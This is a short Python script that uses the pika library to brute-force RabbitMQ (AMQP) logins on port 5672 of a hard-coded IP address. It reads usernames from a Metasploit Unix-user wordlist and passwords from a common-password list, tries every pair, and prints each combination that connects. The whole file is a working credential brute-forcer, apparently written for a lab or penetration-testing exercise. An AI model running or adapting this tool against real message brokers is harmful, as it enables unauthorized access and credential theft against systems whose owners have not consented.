import pika
target="192.92.158.3"
user_list="/usr/share/wordlists/metasploit/unix_users.txt"
pass_list="/root/wordlists/100-common-passwords.txt"

with open(user_list, "r") as ins:
    for username in ins:
        with open(pass_list, "r") as ins:
            for password in ins:
                username=username.rstrip()
                password=password.rstrip()
                credentials = pika.PlainCredentials(username, password)
                parameters = pika.ConnectionParameters(target, 5672, '/', credentials)
                try:
                    connection = pika.BlockingConnection(parameters)
                    print("[+] Success. User: " + username + " --- Password: " + password)
                except Exception as e:
                    #print("[-] Connection refused: " + username + " : " + password)
                    continue
print("[+] Brute force finished")
